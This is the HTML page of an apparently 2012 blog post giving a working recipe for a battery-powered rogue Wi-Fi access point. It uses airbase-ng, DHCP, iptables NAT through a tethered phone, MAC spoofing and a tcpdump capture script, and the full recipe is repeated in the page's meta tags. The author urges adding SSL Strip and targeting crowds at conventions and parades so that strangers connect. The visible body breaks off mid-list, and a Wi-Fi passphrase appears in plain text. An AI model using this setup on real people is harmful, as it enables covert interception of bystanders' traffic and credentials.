<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Mobile Hacking - RabbidByte</title>
<meta name="description" content="I have always loved wireless security.  It is just such an easy target.  The only issue that I have had is that I was restricted to carrying around a laptop and I just didn’t like the idea of having to operate the software while I was out.  So I came up with this neat little COMPLETELY mobile wireless hacking/trap solution.  Here is what you will need.Equipment  an Alix board, CF, and enclosure  two ALPHA USB Wireless cards  a cell phone that you can tether to  mobile power solutionNOTESI have written this very quickly and this may not be entirely accurate.  Although the tests that I have done did work this post has been put together using loose notes that I made through my testing.  I may (one day) return to this and tidy it up and add more detail, however I set out to do what I wanted and I wish to move on to newer projects.Instructions  To start build your Alix system.  I built mine with Debian and I found a GREAT tutorial on how to get it loaded on a CF for your Alix board here -&gt; http://www.youtube.com/watch?v=6VPsgR4pMik  Install the most basic packages to to run the system, we will add the other stuff later.  Once you have Debian installed on the CF and the board put together go ahead and start  it up.  Connect to the Alix board with a serial connection using 38400 baud, or 9600 if you didn’t change it in the last step.  Log in to Debian using root and your password  rm -f /etc/udev/rules.d/*_persistent-net.rules  rm -f /etc/udev/rules.d/*_persistent-net-generator.rules  reboot and connect the two USB WLAN cards  Once the system is back up and running log in again with root  install the following packages using the next command  apt-get install wpasupplicant bridge-utils wireless-tools tcpdump ssh  change the file /etc/network/interfaces to look like this (obviously use your wlan interfaces)    # Used by ifup(8) and ifdown(8). See the interfaces(5) manpage or# /usr/share/doc/ifupdown/examples for more information.auto loiface lo inet loopbackallow-hotplug eth0iface eth0 inet dhcpiface wlan1 inet dhcpwpa-ssid &quot;iPhone&quot;wpa-mode managedwpa-conf /root/Rogue-Sniff/conf/iphone.confwpa-psk nodule5958        Now we will need to install a bunch more stuff to get the necessary tools running  apt-get install apt-get install build-essential libssl-dev subversion check install iw  svn co http://trac.aircrack-ng.org/svn/trunk aircrack-ng  Make, check install, and then run airodump-ng-oui-update  Time to get the FakeAP up and running  apt-get install dhcp3-server  update-rc.d sic-dhcp-server remove  cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bak  vi /etc/dhcp/dhcpd.conf and make it similar to this    ddns-update-style ad-hoc;default-lease-time 600;max-lease-time 7200;subnet 10.1.2.0 netmask 255.255.255.0 {option subnet-mask 255.255.255.0;option broadcast-address 10.1.2.255;option routers 10.1.2.1;option domain-name-servers 8.8.8.8;range 10.1.2.100 10.1.2.150;}        airmon-ng start wlan0  airbase-ng -e “ESSID” -c 9 mon0  ifconfig at0 up  ifconfig at0 10.1.2.1 netmask 255.255.255.0  route add -net 10.1.2.0 netmask 255.255.255.0 gw 10.1.2.1  dhcpd -cf /etc/dhcpd/dhcpd.conf -pf /var/run/dhcpd.pid at0  Now you have an AP up and running for the sniffing but you know no one will use it unless you have it providing internet access  Connect the Debian box to your cell phone (tethering) so that you can provide internet access to others on the go  Create the file iPhone.conf and put the WPA/WPA2 settings in to tether to your phone    network={ssid=&quot;iPhone&quot;key_mgmt=WPA-PSKpsk=(put your hex in here -&gt; wpa_passphrase [SSID] [passphrase])}        Test out the connection by running the following  wpa_supplicant -i wlan1 -B -c iphone.conf  Get IP Tables running by creating the following script    #!/bin/shPATH=/usr/sbin:/sbin:/bin:/usr/bin## delete all existing rules.#iptables -Fiptables -t nat -Fiptables -t mangle -Fiptables -X# Always accept loopback trafficiptables -A INPUT -i lo -j ACCEPT# Allow established connections, and those not coming from the outsideiptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPTiptables -A INPUT -m state --state NEW -j ACCEPTiptables -A FORWARD -i wlan1 -o at0 -m state --state ESTABLISHED,RELATED -j ACCEPT# Allow outgoing connections from the LAN side.iptables -A FORWARD -i at0 -o wlan1 -j ACCEPTiptables -t nat -A PREROUTING -p tcp -i at0 --destination-port 80 -j REDIRECT --to-port 8080# Masquerade.iptables -t nat -A POSTROUTING -o wlan1 -j MASQUERADE# Don&#39;t forward from the outside to the inside.iptables -A FORWARD -i wlan1 -o wlan1 -j REJECT# Enable routing.echo 1 &gt; /proc/sys/net/ipv4/ip_forward        If that is all working for you create a bash script with the following (with values that will work for your network)    #! /bin/bash# bring up the rogue and start sniffingcd /# change the mac to a Linksys AP/usr/bin/macchanger --mac=00:06:25:3E:BD:93 wlan0/usr/bin/macchanger -r wlan1echo &quot;connecting to phone&quot;/sbin/wpa_supplicant -i wlan1 -B -c /root/iphone.confsleep 45echo &quot;getting ip address&quot;/sbin/dhclient wlan1/usr/local/sbin/airbase-ng --essid hotspot -c 11 wlan0 &amp;sleep 15/sbin/ifconfig at0 10.1.1.2 netmask 255.255.255.0/sbin/route add -net 10.1.1.0 netmask 255.255.255.0 gw 10.1.1.2/sbin/ifconfig at0 upsleep 5/usr/sbin/dhcpd -cf /etc/dhcp/dhcpd.conf./root/Rogue-Sniff/iptables.shtcpdump -i wlan1 -s 0 -e -vv -XX link[25] != 0x80 -w /root/Rogue-Sniff/capture        Add a line to execute this script at startup with rc.local  Now that your CF card is at a point where you want it pull it off the Alix board and DD it to another Linux box so that you will never have to go through all this again.  Connect your portable power source and out the door you go!  I used two 9V batteries that do power the setup, but I highly doubt that it would last long.Going Further  When acting as an AP for people the main point here is to sniff traffic and record it.  What point would it be to record encrypted traffic?  Go a little further with this and throw SSL Strip into the mix!  Very Useful Applications (if you have room on the CF)          python      python-twisted-web      kismet      nmap      telnet      fping      smbclient      curl      links      dnsutils      Tenable Nessus      Metasploit Framework        The best places to take advantage of wireless networks is in highly populated areas that do not have hotspots.  Think of a convention or parade.  Some people really what to get on the net, and you could even highjack their broadcasts … say they are probing for “linksys” why not rename your SSID?Images of My Project">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="RabbidByte">
<meta property="og:title" content="Mobile Hacking">
<meta property="og:url" content="http://192.168.1.30:4000/Mobile-Hacking.html">


  <meta property="og:description" content="I have always loved wireless security.  It is just such an easy target.  The only issue that I have had is that I was restricted to carrying around a laptop and I just didn’t like the idea of having to operate the software while I was out.  So I came up with this neat little COMPLETELY mobile wireless hacking/trap solution.  Here is what you will need.Equipment  an Alix board, CF, and enclosure  two ALPHA USB Wireless cards  a cell phone that you can tether to  mobile power solutionNOTESI have written this very quickly and this may not be entirely accurate.  Although the tests that I have done did work this post has been put together using loose notes that I made through my testing.  I may (one day) return to this and tidy it up and add more detail, however I set out to do what I wanted and I wish to move on to newer projects.Instructions  To start build your Alix system.  I built mine with Debian and I found a GREAT tutorial on how to get it loaded on a CF for your Alix board here -&gt; http://www.youtube.com/watch?v=6VPsgR4pMik  Install the most basic packages to to run the system, we will add the other stuff later.  Once you have Debian installed on the CF and the board put together go ahead and start  it up.  Connect to the Alix board with a serial connection using 38400 baud, or 9600 if you didn’t change it in the last step.  Log in to Debian using root and your password  rm -f /etc/udev/rules.d/*_persistent-net.rules  rm -f /etc/udev/rules.d/*_persistent-net-generator.rules  reboot and connect the two USB WLAN cards  Once the system is back up and running log in again with root  install the following packages using the next command  apt-get install wpasupplicant bridge-utils wireless-tools tcpdump ssh  change the file /etc/network/interfaces to look like this (obviously use your wlan interfaces)    # Used by ifup(8) and ifdown(8). See the interfaces(5) manpage or# /usr/share/doc/ifupdown/examples for more information.auto loiface lo inet loopbackallow-hotplug eth0iface eth0 inet dhcpiface wlan1 inet dhcpwpa-ssid &quot;iPhone&quot;wpa-mode managedwpa-conf /root/Rogue-Sniff/conf/iphone.confwpa-psk nodule5958        Now we will need to install a bunch more stuff to get the necessary tools running  apt-get install apt-get install build-essential libssl-dev subversion check install iw  svn co http://trac.aircrack-ng.org/svn/trunk aircrack-ng  Make, check install, and then run airodump-ng-oui-update  Time to get the FakeAP up and running  apt-get install dhcp3-server  update-rc.d sic-dhcp-server remove  cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bak  vi /etc/dhcp/dhcpd.conf and make it similar to this    ddns-update-style ad-hoc;default-lease-time 600;max-lease-time 7200;subnet 10.1.2.0 netmask 255.255.255.0 {option subnet-mask 255.255.255.0;option broadcast-address 10.1.2.255;option routers 10.1.2.1;option domain-name-servers 8.8.8.8;range 10.1.2.100 10.1.2.150;}        airmon-ng start wlan0  airbase-ng -e “ESSID” -c 9 mon0  ifconfig at0 up  ifconfig at0 10.1.2.1 netmask 255.255.255.0  route add -net 10.1.2.0 netmask 255.255.255.0 gw 10.1.2.1  dhcpd -cf /etc/dhcpd/dhcpd.conf -pf /var/run/dhcpd.pid at0  Now you have an AP up and running for the sniffing but you know no one will use it unless you have it providing internet access  Connect the Debian box to your cell phone (tethering) so that you can provide internet access to others on the go  Create the file iPhone.conf and put the WPA/WPA2 settings in to tether to your phone    network={ssid=&quot;iPhone&quot;key_mgmt=WPA-PSKpsk=(put your hex in here -&gt; wpa_passphrase [SSID] [passphrase])}        Test out the connection by running the following  wpa_supplicant -i wlan1 -B -c iphone.conf  Get IP Tables running by creating the following script    #!/bin/shPATH=/usr/sbin:/sbin:/bin:/usr/bin## delete all existing rules.#iptables -Fiptables -t nat -Fiptables -t mangle -Fiptables -X# Always accept loopback trafficiptables -A INPUT -i lo -j ACCEPT# Allow established connections, and those not coming from the outsideiptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPTiptables -A INPUT -m state --state NEW -j ACCEPTiptables -A FORWARD -i wlan1 -o at0 -m state --state ESTABLISHED,RELATED -j ACCEPT# Allow outgoing connections from the LAN side.iptables -A FORWARD -i at0 -o wlan1 -j ACCEPTiptables -t nat -A PREROUTING -p tcp -i at0 --destination-port 80 -j REDIRECT --to-port 8080# Masquerade.iptables -t nat -A POSTROUTING -o wlan1 -j MASQUERADE# Don&#39;t forward from the outside to the inside.iptables -A FORWARD -i wlan1 -o wlan1 -j REJECT# Enable routing.echo 1 &gt; /proc/sys/net/ipv4/ip_forward        If that is all working for you create a bash script with the following (with values that will work for your network)    #! /bin/bash# bring up the rogue and start sniffingcd /# change the mac to a Linksys AP/usr/bin/macchanger --mac=00:06:25:3E:BD:93 wlan0/usr/bin/macchanger -r wlan1echo &quot;connecting to phone&quot;/sbin/wpa_supplicant -i wlan1 -B -c /root/iphone.confsleep 45echo &quot;getting ip address&quot;/sbin/dhclient wlan1/usr/local/sbin/airbase-ng --essid hotspot -c 11 wlan0 &amp;sleep 15/sbin/ifconfig at0 10.1.1.2 netmask 255.255.255.0/sbin/route add -net 10.1.1.0 netmask 255.255.255.0 gw 10.1.1.2/sbin/ifconfig at0 upsleep 5/usr/sbin/dhcpd -cf /etc/dhcp/dhcpd.conf./root/Rogue-Sniff/iptables.shtcpdump -i wlan1 -s 0 -e -vv -XX link[25] != 0x80 -w /root/Rogue-Sniff/capture        Add a line to execute this script at startup with rc.local  Now that your CF card is at a point where you want it pull it off the Alix board and DD it to another Linux box so that you will never have to go through all this again.  Connect your portable power source and out the door you go!  I used two 9V batteries that do power the setup, but I highly doubt that it would last long.Going Further  When acting as an AP for people the main point here is to sniff traffic and record it.  What point would it be to record encrypted traffic?  Go a little further with this and throw SSL Strip into the mix!  Very Useful Applications (if you have room on the CF)          python      python-twisted-web      kismet      nmap      telnet      fping      smbclient      curl      links      dnsutils      Tenable Nessus      Metasploit Framework        The best places to take advantage of wireless networks is in highly populated areas that do not have hotspots.  Think of a convention or parade.  Some people really what to get on the net, and you could even highjack their broadcasts … say they are probing for “linksys” why not rename your SSID?Images of My Project">





  <meta name="twitter:site" content="@RabbidByte">
  <meta name="twitter:title" content="Mobile Hacking">
  <meta name="twitter:description" content="I have always loved wireless security.  It is just such an easy target.  The only issue that I have had is that I was restricted to carrying around a laptop and I just didn’t like the idea of having to operate the software while I was out.  So I came up with this neat little COMPLETELY mobile wireless hacking/trap solution.  Here is what you will need.Equipment  an Alix board, CF, and enclosure  two ALPHA USB Wireless cards  a cell phone that you can tether to  mobile power solutionNOTESI have written this very quickly and this may not be entirely accurate.  Although the tests that I have done did work this post has been put together using loose notes that I made through my testing.  I may (one day) return to this and tidy it up and add more detail, however I set out to do what I wanted and I wish to move on to newer projects.Instructions  To start build your Alix system.  I built mine with Debian and I found a GREAT tutorial on how to get it loaded on a CF for your Alix board here -&gt; http://www.youtube.com/watch?v=6VPsgR4pMik  Install the most basic packages to to run the system, we will add the other stuff later.  Once you have Debian installed on the CF and the board put together go ahead and start  it up.  Connect to the Alix board with a serial connection using 38400 baud, or 9600 if you didn’t change it in the last step.  Log in to Debian using root and your password  rm -f /etc/udev/rules.d/*_persistent-net.rules  rm -f /etc/udev/rules.d/*_persistent-net-generator.rules  reboot and connect the two USB WLAN cards  Once the system is back up and running log in again with root  install the following packages using the next command  apt-get install wpasupplicant bridge-utils wireless-tools tcpdump ssh  change the file /etc/network/interfaces to look like this (obviously use your wlan interfaces)    # Used by ifup(8) and ifdown(8). See the interfaces(5) manpage or# /usr/share/doc/ifupdown/examples for more information.auto loiface lo inet loopbackallow-hotplug eth0iface eth0 inet dhcpiface wlan1 inet dhcpwpa-ssid &quot;iPhone&quot;wpa-mode managedwpa-conf /root/Rogue-Sniff/conf/iphone.confwpa-psk nodule5958        Now we will need to install a bunch more stuff to get the necessary tools running  apt-get install apt-get install build-essential libssl-dev subversion check install iw  svn co http://trac.aircrack-ng.org/svn/trunk aircrack-ng  Make, check install, and then run airodump-ng-oui-update  Time to get the FakeAP up and running  apt-get install dhcp3-server  update-rc.d sic-dhcp-server remove  cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bak  vi /etc/dhcp/dhcpd.conf and make it similar to this    ddns-update-style ad-hoc;default-lease-time 600;max-lease-time 7200;subnet 10.1.2.0 netmask 255.255.255.0 {option subnet-mask 255.255.255.0;option broadcast-address 10.1.2.255;option routers 10.1.2.1;option domain-name-servers 8.8.8.8;range 10.1.2.100 10.1.2.150;}        airmon-ng start wlan0  airbase-ng -e “ESSID” -c 9 mon0  ifconfig at0 up  ifconfig at0 10.1.2.1 netmask 255.255.255.0  route add -net 10.1.2.0 netmask 255.255.255.0 gw 10.1.2.1  dhcpd -cf /etc/dhcpd/dhcpd.conf -pf /var/run/dhcpd.pid at0  Now you have an AP up and running for the sniffing but you know no one will use it unless you have it providing internet access  Connect the Debian box to your cell phone (tethering) so that you can provide internet access to others on the go  Create the file iPhone.conf and put the WPA/WPA2 settings in to tether to your phone    network={ssid=&quot;iPhone&quot;key_mgmt=WPA-PSKpsk=(put your hex in here -&gt; wpa_passphrase [SSID] [passphrase])}        Test out the connection by running the following  wpa_supplicant -i wlan1 -B -c iphone.conf  Get IP Tables running by creating the following script    #!/bin/shPATH=/usr/sbin:/sbin:/bin:/usr/bin## delete all existing rules.#iptables -Fiptables -t nat -Fiptables -t mangle -Fiptables -X# Always accept loopback trafficiptables -A INPUT -i lo -j ACCEPT# Allow established connections, and those not coming from the outsideiptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPTiptables -A INPUT -m state --state NEW -j ACCEPTiptables -A FORWARD -i wlan1 -o at0 -m state --state ESTABLISHED,RELATED -j ACCEPT# Allow outgoing connections from the LAN side.iptables -A FORWARD -i at0 -o wlan1 -j ACCEPTiptables -t nat -A PREROUTING -p tcp -i at0 --destination-port 80 -j REDIRECT --to-port 8080# Masquerade.iptables -t nat -A POSTROUTING -o wlan1 -j MASQUERADE# Don&#39;t forward from the outside to the inside.iptables -A FORWARD -i wlan1 -o wlan1 -j REJECT# Enable routing.echo 1 &gt; /proc/sys/net/ipv4/ip_forward        If that is all working for you create a bash script with the following (with values that will work for your network)    #! /bin/bash# bring up the rogue and start sniffingcd /# change the mac to a Linksys AP/usr/bin/macchanger --mac=00:06:25:3E:BD:93 wlan0/usr/bin/macchanger -r wlan1echo &quot;connecting to phone&quot;/sbin/wpa_supplicant -i wlan1 -B -c /root/iphone.confsleep 45echo &quot;getting ip address&quot;/sbin/dhclient wlan1/usr/local/sbin/airbase-ng --essid hotspot -c 11 wlan0 &amp;sleep 15/sbin/ifconfig at0 10.1.1.2 netmask 255.255.255.0/sbin/route add -net 10.1.1.0 netmask 255.255.255.0 gw 10.1.1.2/sbin/ifconfig at0 upsleep 5/usr/sbin/dhcpd -cf /etc/dhcp/dhcpd.conf./root/Rogue-Sniff/iptables.shtcpdump -i wlan1 -s 0 -e -vv -XX link[25] != 0x80 -w /root/Rogue-Sniff/capture        Add a line to execute this script at startup with rc.local  Now that your CF card is at a point where you want it pull it off the Alix board and DD it to another Linux box so that you will never have to go through all this again.  Connect your portable power source and out the door you go!  I used two 9V batteries that do power the setup, but I highly doubt that it would last long.Going Further  When acting as an AP for people the main point here is to sniff traffic and record it.  What point would it be to record encrypted traffic?  Go a little further with this and throw SSL Strip into the mix!  Very Useful Applications (if you have room on the CF)          python      python-twisted-web      kismet      nmap      telnet      fping      smbclient      curl      links      dnsutils      Tenable Nessus      Metasploit Framework        The best places to take advantage of wireless networks is in highly populated areas that do not have hotspots.  Think of a convention or parade.  Some people really what to get on the net, and you could even highjack their broadcasts … say they are probing for “linksys” why not rename your SSID?Images of My Project">
  <meta name="twitter:url" content="http://192.168.1.30:4000/Mobile-Hacking.html">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2012-05-16T01:00:00-06:00">





  

  


<link rel="canonical" href="http://192.168.1.30:4000/Mobile-Hacking.html">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "RabbidByte",
      "url": "http://192.168.1.30:4000/",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="RabbidByte Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->
<link rel="apple-touch-icon" sizes="180x180" href="/assets/fav/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/fav/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/fav/favicon-16x16.png">
<link rel="manifest" href="/assets/fav/site.webmanifest">
<link rel="mask-icon" href="/assets/fav/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">
<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--splash">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/88x88.png" alt=""></a>
        
        <a class="site-title" href="/">RabbidByte</a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/index.html" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/tools.html" >Tools</a>
            </li><li class="masthead__menu-item">
              <a href="/ctf.html" >CtF</a>
            </li><li class="masthead__menu-item">
              <a href="/resources.html" >Resources</a>
            </li><li class="masthead__menu-item">
              <a href="/about.html" >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      

<div id="main" role="main">
  <article class="splash" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Mobile Hacking">
    <meta itemprop="description" content="I have always loved wireless security.  It is just such an easy target.  The only issue that I have had is that I was restricted to carrying around a laptop and I just didn’t like the idea of having to operate the software while I was out.  So I came up with this neat little COMPLETELY mobile wireless hacking/trap solution.  Here is what you will need.Equipment  an Alix board, CF, and enclosure  two ALPHA USB Wireless cards  a cell phone that you can tether to  mobile power solutionNOTESI have written this very quickly and this may not be entirely accurate.  Although the tests that I have done did work this post has been put together using loose notes that I made through my testing.  I may (one day) return to this and tidy it up and add more detail, however I set out to do what I wanted and I wish to move on to newer projects.Instructions  To start build your Alix system.  I built mine with Debian and I found a GREAT tutorial on how to get it loaded on a CF for your Alix board here -&gt; http://www.youtube.com/watch?v=6VPsgR4pMik  Install the most basic packages to to run the system, we will add the other stuff later.  Once you have Debian installed on the CF and the board put together go ahead and start  it up.  Connect to the Alix board with a serial connection using 38400 baud, or 9600 if you didn’t change it in the last step.  Log in to Debian using root and your password  rm -f /etc/udev/rules.d/*_persistent-net.rules  rm -f /etc/udev/rules.d/*_persistent-net-generator.rules  reboot and connect the two USB WLAN cards  Once the system is back up and running log in again with root  install the following packages using the next command  apt-get install wpasupplicant bridge-utils wireless-tools tcpdump ssh  change the file /etc/network/interfaces to look like this (obviously use your wlan interfaces)    # Used by ifup(8) and ifdown(8). See the interfaces(5) manpage or# /usr/share/doc/ifupdown/examples for more information.auto loiface lo inet loopbackallow-hotplug eth0iface eth0 inet dhcpiface wlan1 inet dhcpwpa-ssid &quot;iPhone&quot;wpa-mode managedwpa-conf /root/Rogue-Sniff/conf/iphone.confwpa-psk nodule5958        Now we will need to install a bunch more stuff to get the necessary tools running  apt-get install apt-get install build-essential libssl-dev subversion check install iw  svn co http://trac.aircrack-ng.org/svn/trunk aircrack-ng  Make, check install, and then run airodump-ng-oui-update  Time to get the FakeAP up and running  apt-get install dhcp3-server  update-rc.d sic-dhcp-server remove  cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bak  vi /etc/dhcp/dhcpd.conf and make it similar to this    ddns-update-style ad-hoc;default-lease-time 600;max-lease-time 7200;subnet 10.1.2.0 netmask 255.255.255.0 {option subnet-mask 255.255.255.0;option broadcast-address 10.1.2.255;option routers 10.1.2.1;option domain-name-servers 8.8.8.8;range 10.1.2.100 10.1.2.150;}        airmon-ng start wlan0  airbase-ng -e “ESSID” -c 9 mon0  ifconfig at0 up  ifconfig at0 10.1.2.1 netmask 255.255.255.0  route add -net 10.1.2.0 netmask 255.255.255.0 gw 10.1.2.1  dhcpd -cf /etc/dhcpd/dhcpd.conf -pf /var/run/dhcpd.pid at0  Now you have an AP up and running for the sniffing but you know no one will use it unless you have it providing internet access  Connect the Debian box to your cell phone (tethering) so that you can provide internet access to others on the go  Create the file iPhone.conf and put the WPA/WPA2 settings in to tether to your phone    network={ssid=&quot;iPhone&quot;key_mgmt=WPA-PSKpsk=(put your hex in here -&gt; wpa_passphrase [SSID] [passphrase])}        Test out the connection by running the following  wpa_supplicant -i wlan1 -B -c iphone.conf  Get IP Tables running by creating the following script    #!/bin/shPATH=/usr/sbin:/sbin:/bin:/usr/bin## delete all existing rules.#iptables -Fiptables -t nat -Fiptables -t mangle -Fiptables -X# Always accept loopback trafficiptables -A INPUT -i lo -j ACCEPT# Allow established connections, and those not coming from the outsideiptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPTiptables -A INPUT -m state --state NEW -j ACCEPTiptables -A FORWARD -i wlan1 -o at0 -m state --state ESTABLISHED,RELATED -j ACCEPT# Allow outgoing connections from the LAN side.iptables -A FORWARD -i at0 -o wlan1 -j ACCEPTiptables -t nat -A PREROUTING -p tcp -i at0 --destination-port 80 -j REDIRECT --to-port 8080# Masquerade.iptables -t nat -A POSTROUTING -o wlan1 -j MASQUERADE# Don&#39;t forward from the outside to the inside.iptables -A FORWARD -i wlan1 -o wlan1 -j REJECT# Enable routing.echo 1 &gt; /proc/sys/net/ipv4/ip_forward        If that is all working for you create a bash script with the following (with values that will work for your network)    #! /bin/bash# bring up the rogue and start sniffingcd /# change the mac to a Linksys AP/usr/bin/macchanger --mac=00:06:25:3E:BD:93 wlan0/usr/bin/macchanger -r wlan1echo &quot;connecting to phone&quot;/sbin/wpa_supplicant -i wlan1 -B -c /root/iphone.confsleep 45echo &quot;getting ip address&quot;/sbin/dhclient wlan1/usr/local/sbin/airbase-ng --essid hotspot -c 11 wlan0 &amp;sleep 15/sbin/ifconfig at0 10.1.1.2 netmask 255.255.255.0/sbin/route add -net 10.1.1.0 netmask 255.255.255.0 gw 10.1.1.2/sbin/ifconfig at0 upsleep 5/usr/sbin/dhcpd -cf /etc/dhcp/dhcpd.conf./root/Rogue-Sniff/iptables.shtcpdump -i wlan1 -s 0 -e -vv -XX link[25] != 0x80 -w /root/Rogue-Sniff/capture        Add a line to execute this script at startup with rc.local  Now that your CF card is at a point where you want it pull it off the Alix board and DD it to another Linux box so that you will never have to go through all this again.  Connect your portable power source and out the door you go!  I used two 9V batteries that do power the setup, but I highly doubt that it would last long.Going Further  When acting as an AP for people the main point here is to sniff traffic and record it.  What point would it be to record encrypted traffic?  Go a little further with this and throw SSL Strip into the mix!  Very Useful Applications (if you have room on the CF)          python      python-twisted-web      kismet      nmap      telnet      fping      smbclient      curl      links      dnsutils      Tenable Nessus      Metasploit Framework        The best places to take advantage of wireless networks is in highly populated areas that do not have hotspots.  Think of a convention or parade.  Some people really what to get on the net, and you could even highjack their broadcasts … say they are probing for “linksys” why not rename your SSID?Images of My Project">
    <meta itemprop="datePublished" content="May 16, 2012">
    

    <section class="page__content" itemprop="text">
      <p>I have always loved wireless security.  It is just such an easy target.  The only issue that I have had is that I was restricted to carrying around a laptop and I just didn’t like the idea of having to operate the software while I was out.  So I came up with this neat little COMPLETELY mobile wireless hacking/trap solution.  Here is what you will need.</p>

<h2 id="equipment">Equipment</h2>

<ol>
  <li>an Alix board, CF, and enclosure</li>
  <li>two ALPHA USB Wireless cards</li>
  <li>a cell phone that you can tether to</li>
  <li>mobile power solution</li>
</ol>

<h2 id="notes">NOTES</h2>

<p>I have written this very quickly and this may not be entirely accurate.  Although the tests that I have done did work this post has been put together using loose notes that I made through my testing.  I may (one day) return to this and tidy it up and add more detail, however I set out to do what I wanted and I wish to move on to newer projects.</p>

<h2 id="instructions">Instructions</h2>
<ol>
  <li>To start build your Alix system.  I built mine with Debian and I found a GREAT tutorial on how to get it loaded on a CF for your Alix board here -&gt; http://www.youtube.com/watch?v=6VPsgR4pMik  Install the most basic packages to to run the system, we will add the other stuff later.</li>
  <li>Once you have Debian installed on the CF and the board put together go ahead and start  it up.  Connect to the Alix board with a serial connection using 38400 baud, or 9600 if you didn’t change it in the last step.</li>
  <li>Log in to Debian using root and your password</li>
  <li>rm -f /etc/udev/rules.d/*_persistent-net.rules</li>
  <li>rm -f /etc/udev/rules.d/*_persistent-net-generator.rules</li>
  <li>reboot and connect the two USB WLAN cards</li>
  <li>Once the system is back up and running log in again with root</li>
  <li>install the following packages using the next command</li>
  <li>apt-get install wpasupplicant bridge-utils wireless-tools tcpdump ssh</li>
  <li>change the file /etc/network/interfaces to look like this (obviously use your wlan interfaces)
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Used by ifup(8) and ifdown(8). See the interfaces(5) manpage or
# /usr/share/doc/ifupdown/examples for more information.
auto lo
iface lo inet loopback
allow-hotplug eth0
iface eth0 inet dhcp
iface wlan1 inet dhcp
wpa-ssid "iPhone"
wpa-mode managed
wpa-conf /root/Rogue-Sniff/conf/iphone.conf
wpa-psk nodule5958
</code></pre></div>    </div>
  </li>
  <li>Now we will need to install a bunch more stuff to get the necessary tools running</li>
  <li>apt-get install apt-get install build-essential libssl-dev subversion check install iw</li>
  <li>svn co http://trac.aircrack-ng.org/svn/trunk aircrack-ng</li>
  <li>Make, check install, and then run airodump-ng-oui-update</li>
  <li>Time to get the FakeAP up and running</li>
  <li>apt-get install dhcp3-server</li>
  <li>update-rc.d sic-dhcp-server remove</li>
  <li>cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bak</li>
  <li>vi /etc/dhcp/dhcpd.conf and make it similar to this
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ddns-update-style ad-hoc;
default-lease-time 600;
max-lease-time 7200;
subnet 10.1.2.0 netmask 255.255.255.0 {
option subnet-mask 255.255.255.0;
option broadcast-address 10.1.2.255;
option routers 10.1.2.1;
option domain-name-servers 8.8.8.8;
range 10.1.2.100 10.1.2.150;
}
</code></pre></div>    </div>
  </li>
  <li>airmon-ng start wlan0</li>
  <li>airbase-ng -e “ESSID” -c 9 mon0</li>
  <li>ifconfig at0 up</li>
  <li>ifconfig at0 10.1.2.1 netmask 255.255.255.0</li>
  <li>route add -net 10.1.2.0 netmask 255.255.255.0 gw 10.1.2.1</li>
  <li>dhcpd -cf /etc/dhcpd/dhcpd.conf -pf /var/run/dhcpd.pid at0</li>
  <li>Now you have an AP up and running for the sniffing but you know no one will use it unless you have it providing internet access</li>
  <li>Connect the Debian box to your cell phone (tethering) so that you can provide internet access to others on the go</li>
  <li>Create the file iPhone.conf and put the WPA/WPA2 settings in to tether to your phone
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>network={
ssid="iPhone"
key_mgmt=WPA-PSK
psk=(put your hex in here -&gt; wpa_passphrase [SSID] [passphrase])
}
</code></pre></div>    </div>
  </li>
  <li>Test out the connection by running the following</li>
  <li>wpa_supplicant -i wlan1 -B -c iphone.conf</li>
  <li>Get IP Tables running by creating the following script
